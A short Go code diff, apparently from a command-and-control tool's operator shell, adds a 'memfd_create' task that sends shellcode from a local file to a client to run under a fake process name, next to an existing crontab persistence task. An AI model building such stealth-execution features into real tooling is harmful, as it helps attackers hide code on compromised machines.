@@ -611,6 +611,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithOneArg(c, clientId, command, "<pathToBinary>: ")
 	case "crontab":
 		PrepareTaskWithOneArg(c, clientId, command, "<command>: ")
+	case "memfd_create":
+		PrepareShellcodeTask(c,clientId,command,"<localFile>;<fakeProcessName>: ")
 	default:
 		c.Println("Task not found.")
 	}
